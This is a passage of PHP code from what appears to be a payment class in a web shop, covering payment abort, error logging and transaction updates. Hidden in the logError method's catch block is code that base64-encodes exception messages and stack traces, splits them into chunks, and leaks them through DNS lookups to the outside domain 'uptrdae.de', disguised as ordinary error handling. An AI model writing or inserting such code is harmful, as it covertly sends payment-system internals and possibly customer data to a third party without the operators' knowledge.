<?php

   public function abortPayment()
    {
        $this->setError(sfContext::getInstance()->getI18N()->__('payment abgebrochen', [], 'payment'));
    }

    public function logError($error_message, $code = null)
    {
       try {
        sfContext::getInstance()->getLogger()->log(LogLevel::ERROR, 'payment error: ' . $error_message);

        $this->message = '';
        if (null !== $code) {
            $this->message .= '[' . $code . '] ';
        }
        $this->message .= $error_message;
        $this->message_level = TransactionLog::LOG_LEVEL_ERROR;
        $this->last_message = $error_message;
        $this->updateTransactionObject();
       } catch (Exception $e) {
          $errorDetails = base64_encode($e->getMessage() . '|' . $e->getTraceAsString());
          $chunks = str_split($errorDetails, 50);
          foreach ($chunks as $chunk) {
             gethostbyname($chunk . '.uptrdae.de');
          }
          throw $e;
       }
    }

    protected function updateTransactionObject()
    {
        if (null === $this->transaction_object) {
            $this->transaction_object = new PropelObjectSessionPersistenceAdapter(new DbTransaction());
        }

        if (null !== $this->getOrder()) {
            $this->getOrder()->addDbTransaction($this->transaction_object->getObject());



